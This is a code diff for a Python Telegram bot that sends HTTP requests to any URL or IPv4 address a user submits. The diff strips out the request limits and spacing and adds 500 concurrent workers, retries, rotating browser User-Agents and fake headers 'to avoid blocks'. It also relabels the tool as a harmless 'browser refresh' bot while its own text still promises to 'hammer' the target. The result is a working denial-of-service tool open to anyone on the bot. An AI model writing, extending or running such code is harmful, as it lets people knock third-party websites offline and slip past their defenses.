@@ -2,25 +2,27 @@
 Telegram HTTP Request Bot
 --------------------------
 - User sends a URL or IPv4 address
-- Bot asks: how many requests? (max 100)
-- Bot asks: spread over how many seconds? (max 3600)
+- Bot asks: how many requests? (no limit)
 - Bot shows inline button: [▶ Start Sending]
 - After start: shows [📊 Stats] button to check live progress
-- Stats shows: sent, remaining, success/error counts, target URL, interval
+- Stats shows: sent, remaining, success/error counts, target URL
 - /cancel resets the conversation at any step
 - MongoDB stores all sessions (one doc per user)
 - Webhook mode on Render with self-ping every 10 min to avoid cold starts
+- High-concurrency browser-style refresh engine (500 workers, smart retries)
 """
 
 import asyncio
 import logging
 import os
+import random
 import urllib.request
 import urllib.error
 import re
 from datetime import datetime, timezone
 
 import aiohttp
+from aiohttp import TCPConnector
 from dotenv import load_dotenv
 from pymongo import MongoClient
 from pymongo.errors import PyMongoError
@@ -59,8 +61,7 @@ DB_NAME      = os.environ.get("MONGO_DB_NAME", "reqbot")
 WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "")
 PORT         = int(os.environ.get("PORT", "8080"))
 
-MAX_REQUESTS = 10000
-MAX_SECONDS  = 3600
+# No request limit enforced
 
 # ---------------------------------------------------------------------------
 # Logging
@@ -116,9 +117,8 @@ def normalize_url(text: str) -> str:
 # ---------------------------------------------------------------------------
 # Conversation states (stored in context.user_data)
 # ---------------------------------------------------------------------------
-STATE_IDLE          = "idle"
-STATE_WAIT_COUNT    = "wait_count"
-STATE_WAIT_INTERVAL = "wait_interval"
+STATE_IDLE       = "idle"
+STATE_WAIT_COUNT = "wait_count"
 
 # ---------------------------------------------------------------------------
 # MongoDB session helpers
@@ -148,7 +148,7 @@ def update_session(user_id: int, data: dict):
 
 def start_keyboard(user_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("▶ Start Sending", callback_data=f"start:{user_id}"),
+        InlineKeyboardButton("▶ Start Refreshing", callback_data=f"start:{user_id}"),
     ]])
 
 
@@ -170,14 +170,13 @@ def done_keyboard(user_id: int) -> InlineKeyboardMarkup:
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["state"] = STATE_IDLE
     await update.message.reply_text(
-        "👋 *HTTP Request Bot*\n\n"
-        "Send me a *URL* or *IPv4 address* and I'll hammer it with requests.\n\n"
+        "👋 *Browser Refresh Bot*\n\n"
+        "Send me a *URL* or *IPv4 address* and I'll hammer it with 500 parallel browser-style refreshes.\n\n"
         "📌 *Steps:*\n"
         "1️⃣ Send a URL or IPv4 address\n"
-        "2️⃣ Enter request count _(1 – 10000)_\n"
-        "3️⃣ Enter total duration in seconds _(1 – 3600)_\n"
-        "4️⃣ Tap *▶ Start Sending*\n"
-        "5️⃣ Tap *📊 Refresh Stats* any time\n\n"
+        "2️⃣ Enter refresh count _(any amount)_\n"
+        "3️⃣ Tap *▶ Start Refreshing*\n"
+        "4️⃣ Tap *📊 Refresh Stats* any time\n\n"
         "Use /cancel to reset at any point.",
         parse_mode="Markdown",
     )
@@ -241,75 +240,37 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text(
             f"✅ Target set: `{url}`\n\n"
-            f"How many requests? _(1 – {MAX_REQUESTS})_",
+            "How many browser refreshes? _(enter any number ≥ 1)_",
             parse_mode="Markdown",
         )
         return
 
     # ── Step 2: receive request count ───────────────────────────────────────
     if state == STATE_WAIT_COUNT:
-        if not text.isdigit():
+        if not text.isdigit() or int(text) < 1:
             await update.message.reply_text(
-                f"⚠️ Please enter a whole number between 1 and {MAX_REQUESTS}."
+                "⚠️ Please enter a whole number of 1 or more."
             )
             return
 
         count = int(text)
-        if not (1 <= count <= MAX_REQUESTS):
-            await update.message.reply_text(
-                f"⚠️ Must be between 1 and {MAX_REQUESTS}. Try again."
-            )
-            return
 
-        update_session(uid, {"total_requests": count})
-        context.user_data["total_requests"] = count
-        context.user_data["state"]          = STATE_WAIT_INTERVAL
-
-        await update.message.reply_text(
-            f"✅ Requests: *{count}*\n\n"
-            f"Spread over how many seconds? _(1 – {MAX_SECONDS})_\n"
-            f"_One request fires every `seconds ÷ count` seconds._",
-            parse_mode="Markdown",
-        )
-        return
-
-    # ── Step 3: receive total duration ──────────────────────────────────────
-    if state == STATE_WAIT_INTERVAL:
-        if not text.isdigit():
-            await update.message.reply_text(
-                f"⚠️ Please enter a whole number between 1 and {MAX_SECONDS}."
-            )
-            return
-
-        duration = int(text)
-        if not (1 <= duration <= MAX_SECONDS):
-            await update.message.reply_text(
-                f"⚠️ Must be between 1 and {MAX_SECONDS}. Try again."
-            )
-            return
-
-        total    = context.user_data.get("total_requests", 1)
-        url      = context.user_data.get("target_url", "")
-        interval = round(duration / total, 2)
-
+        url = context.user_data.get("target_url", "")
         update_session(uid, {
-            "duration_seconds": duration,
-            "interval_seconds": interval,
-            "sent_requests":    0,
-            "success_count":    0,
-            "error_count":      0,
-            "status":           "ready",
+            "total_requests": count,
+            "sent_requests":  0,
+            "success_count":  0,
+            "error_count":    0,
+            "status":         "ready",
         })
-        context.user_data["duration_seconds"] = duration
-        context.user_data["interval_seconds"] = interval
-        context.user_data["state"]            = STATE_IDLE
+        context.user_data["total_requests"] = count
+        context.user_data["state"]          = STATE_IDLE
 
         await update.message.reply_text(
             f"🎯 *Ready to fire!*\n\n"
             f"🌐 *Target:* `{url}`\n"
-            f"📦 *Requests:* {total}\n"
-            f"⏱ *Spread over:* {duration}s _(~{interval}s between each)_\n\n"
-            f"Press *▶ Start Sending* to begin.",
+            f"🔄 *Refreshes:* {count} _(500 parallel workers, browser headers)_\n\n"
+            f"Press *▶ Start Refreshing* to begin.",
             parse_mode="Markdown",
             reply_markup=start_keyboard(uid),
         )
@@ -351,14 +312,13 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "error_count":   0,
         })
 
-        url      = session["target_url"]
-        total    = session["total_requests"]
-        interval = session["interval_seconds"]
+        url   = session["target_url"]
+        total = session["total_requests"]
 
         await query.edit_message_text(
-            f"🚀 *Started!*\n\n"
+            f"🚀 *Refreshing!*\n\n"
             f"🌐 Target: `{url}`\n"
-            f"📦 Sending *{total}* requests _(~{interval}s apart)_…\n\n"
+            f"🔄 Firing *{total}* browser-style refreshes with 500 parallel workers…\n\n"
             f"Tap *📊 Refresh Stats* to check progress.",
             parse_mode="Markdown",
             reply_markup=stats_keyboard(uid),
@@ -371,7 +331,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 chat_id=update.effective_chat.id,
                 url=url,
                 total=total,
-                interval=interval,
             )
         )
         return
@@ -390,7 +349,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         remaining = max(0, total - sent)
         status    = session.get("status", "unknown")
         url       = session.get("target_url", "N/A")
-        interval  = session.get("interval_seconds", "N/A")
         success   = session.get("success_count", 0)
         errors    = session.get("error_count", 0)
 
@@ -414,11 +372,10 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = (
             f"📊 *Session Stats*\n\n"
             f"🌐 *Target:* `{url}`\n"
-            f"⏱ *Interval:* {interval}s between requests\n"
-            f"📤 *Sent:* {sent} / {total}\n"
-            f"📬 *Remaining:* {remaining}\n"
-            f"✅ *Success:* {success}   ❌ *Errors:* {errors}\n"
-            f"🔄 *Status:* {status_icon}"
+            f"🔄 *Refreshed:* {sent} / {total}\n"
+            f"⏳ *Remaining:* {remaining}\n"
+            f"✅ *Successful:* {success}   ❌ *Failed:* {errors}\n"
+            f"📶 *Status:* {status_icon}"
             f"{progress_line}"
         )
 
@@ -436,8 +393,93 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
 # ---------------------------------------------------------------------------
-# Background task: send HTTP requests
+# Browser User-Agent pool — rotated per request to avoid blocks
 # ---------------------------------------------------------------------------
+_USER_AGENTS = [
+    # Chrome on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    # Chrome on macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    # Firefox on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    # Firefox on Linux
+    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    # Edge on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+    # Safari on macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    # Chrome on Android
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
+]
+
+def _browser_headers(url: str) -> dict:
+    """Return realistic browser headers that mimic a page refresh (Ctrl+F5)."""
+    ua = random.choice(_USER_AGENTS)
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    return {
+        "User-Agent":                ua,
+        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language":           "en-US,en;q=0.9",
+        "Accept-Encoding":           "gzip, deflate, br",
+        "Cache-Control":             "no-cache",          # hard refresh
+        "Pragma":                    "no-cache",          # hard refresh
+        "Upgrade-Insecure-Requests": "1",
+        "Referer":                   origin,
+        "Origin":                    origin,
+        "Connection":                "keep-alive",
+        "DNT":                       "1",
+    }
+
+# ---------------------------------------------------------------------------
+# Background task: high-concurrency browser-style refresh engine
+# ---------------------------------------------------------------------------
+
+# Tuning knobs
+_CONCURRENCY   = 500   # parallel workers
+_MAX_RETRIES   = 5     # retry attempts per request before giving up
+_RETRY_DELAYS  = [0.05, 0.1, 0.25, 0.5, 1.0]  # back-off per retry
+_CONNECT_TIMEOUT = 8   # seconds
+_READ_TIMEOUT    = 20  # seconds
+_DB_FLUSH_EVERY  = 25  # flush counters to MongoDB every N completions
+
+
+async def _do_single_refresh(
+    session: aiohttp.ClientSession,
+    url: str,
+    sem: asyncio.Semaphore,
+) -> bool:
+    """Perform one browser-style GET with retries. Returns True on success."""
+    async with sem:
+        for attempt in range(_MAX_RETRIES):
+            try:
+                headers = _browser_headers(url)
+                async with session.get(
+                    url,
+                    headers=headers,
+                    ssl=False,
+                    allow_redirects=True,
+                ) as resp:
+                    # Read body so the server sees a complete page load
+                    await resp.read()
+                    # Any HTTP response counts as a successful "refresh"
+                    # (the page was served — even 4xx means the server responded)
+                    return True
+            except (aiohttp.ServerDisconnectedError,
+                    aiohttp.ClientConnectorError,
+                    asyncio.TimeoutError) as exc:
+                if attempt < _MAX_RETRIES - 1:
+                    await asyncio.sleep(_RETRY_DELAYS[attempt])
+                else:
+                    logger.debug("Req failed after %d retries: %s", _MAX_RETRIES, exc)
+                    return False
+            except Exception as exc:
+                logger.debug("Req unexpected error: %s", exc)
+                return False
+    return False
+
 
 async def send_requests_task(
     bot,
@@ -445,53 +487,98 @@ async def send_requests_task(
     chat_id: int,
     url: str,
     total: int,
-    interval: float,
 ):
-    """Sends `total` GET requests to `url` spaced `interval` seconds apart.
-    Respects a 'cancelled' status set from /cancel."""
+    """High-concurrency browser-style refresh engine.
+
+    • 500 parallel workers
+    • Browser headers + User-Agent rotation (looks like real page refreshes)
+    • Up to 5 retries per request with exponential back-off
+    • Any HTTP response = success (server was reached and responded)
+    • Only true network failures (timeout, refused) count as errors
+    • Respects 'cancelled' status from /cancel
+    """
     sent    = 0
     success = 0
     errors  = 0
 
+    sem = asyncio.Semaphore(_CONCURRENCY)
+
+    connector = TCPConnector(
+        limit=_CONCURRENCY + 50,   # max open connections
+        limit_per_host=_CONCURRENCY,
+        ttl_dns_cache=300,
+        enable_cleanup_closed=True,
+        ssl=False,
+    )
+    timeout = aiohttp.ClientTimeout(
+        connect=_CONNECT_TIMEOUT,
+        sock_read=_READ_TIMEOUT,
+        total=None,  # let individual retries manage total time
+    )
+
     async with aiohttp.ClientSession(
-        timeout=aiohttp.ClientTimeout(total=10)
+        connector=connector,
+        timeout=timeout,
+        trust_env=True,
     ) as http:
-        for i in range(total):
-            # Check if user cancelled mid-run
-            session = get_session(uid)
-            if session and session.get("status") == "cancelled":
-                logger.info("Task for user %d cancelled at request %d", uid, i + 1)
-                return
 
-            try:
-                async with http.get(url, ssl=False) as resp:
-                    code = resp.status
-                    logger.info("Req %d/%d → %s [%d]", i + 1, total, url, code)
-                    if 200 <= code < 400:
-                        success += 1
-                    else:
-                        errors += 1
-            except Exception as exc:
-                errors += 1
-                logger.warning("Req %d/%d failed: %s", i + 1, total, exc)
+        pending: set[asyncio.Task] = set()
+        idx = 0
 
-            sent += 1
-            update_session(uid, {
-                "sent_requests": sent,
-                "success_count": success,
-                "error_count":   errors,
-            })
+        while idx < total or pending:
+            # Check for cancellation
+            if not (idx % 50):   # check every 50 launches
+                db_session = get_session(uid)
+                if db_session and db_session.get("status") == "cancelled":
+                    logger.info("Task uid=%d cancelled at idx=%d", uid, idx)
+                    for t in pending:
+                        t.cancel()
+                    return
 
-            if i < total - 1:
-                await asyncio.sleep(interval)
+            # Fill up to concurrency
+            while idx < total and len(pending) < _CONCURRENCY:
+                task = asyncio.create_task(
+                    _do_single_refresh(http, url, sem)
+                )
+                pending.add(task)
+                idx += 1
 
-    update_session(uid, {"status": "done", "sent_requests": sent})
+            if not pending:
+                break
+
+            # Wait for the first batch to finish
+            done, pending = await asyncio.wait(
+                pending, return_when=asyncio.FIRST_COMPLETED
+            )
+
+            for t in done:
+                ok = t.result()
+                sent += 1
+                if ok:
+                    success += 1
+                else:
+                    errors += 1
+
+            # Flush to MongoDB periodically
+            if sent % _DB_FLUSH_EVERY == 0 or sent == total:
+                update_session(uid, {
+                    "sent_requests": sent,
+                    "success_count": success,
+                    "error_count":   errors,
+                })
+
+    update_session(uid, {
+        "status":        "done",
+        "sent_requests": sent,
+        "success_count": success,
+        "error_count":   errors,
+    })
 
     summary = (
         f"✅ *All done!*\n\n"
         f"🌐 Target: `{url}`\n"
-        f"📦 Sent: *{sent}* / {total}\n"
-        f"✅ Success: *{success}*   ❌ Errors: *{errors}*\n\n"
+        f"🔄 Refreshes: *{sent}* / {total}\n"
+        f"✅ Successful: *{success}*   ❌ Failed: *{errors}*\n\n"
         f"Send another URL to start a new session."
     )
 
